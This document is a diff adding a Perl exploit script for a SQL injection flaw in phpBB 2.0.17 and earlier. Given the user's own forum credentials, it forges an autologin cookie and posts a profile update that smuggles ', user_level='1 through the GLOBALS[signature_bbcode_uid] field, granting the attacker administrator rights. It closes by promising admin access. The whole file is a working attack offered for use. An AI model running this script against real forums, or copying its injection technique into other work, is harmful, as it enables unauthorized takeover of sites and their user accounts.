@@ -1,0 +1,39 @@
+#!/usr/bin/perl
+
+# Exploit for sql injection in phpbb <=2.0.17
+# It works with php5, with register_globals on and magic_quotes_gpc off
+# Author: Eax (eax@cc-team.org)
+
+
+use strict;
+use LWP::UserAgent;
+use Digest::MD5 'md5_hex';
+
+if (@ARGV<6){
+print "Usage $0 host path your_id your_password your_email your_username\n";
+print "example: $0 target.org /phpbb/ 10 blebleble ble\@ble.pl ble\n\n";
+exit;
+}
+
+my $host = $ARGV[0];
+my $path = $ARGV[1];
+my $userid = $ARGV[2];
+my $passwd = $ARGV[3];
+my $mail = $ARGV[4];
+my $username = $ARGV[5];
+
+$passwd = md5_hex($passwd);
+
+my $cookie_string = "phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A32%3A%2
+2".$passwd."%22%3Bs%3A6%3A%22userid%22%3Bi%3A".$userid."%3B%7D";
+
+my $browser = LWP::UserAgent->new ();
+$browser->default_header(Cookie=>$cookie_string);
+
+my $address = 'http://'.$host.$path.'profile.php';
+my $response = $browser->post($address, [ "username" => $username, "email" => $mail,
+"mode"=>'editprofile', "agreed"=>'true', "coppa"=>'0', "user_id"=>$userid, "
+current_email"=>$mail, "submit"=>"Submit", 'GLOBALS[signature_bbcode_uid]'=>"', u
+ser_level='1"]);
+
+print "if everything was ok you should have admin rights now :)\n";
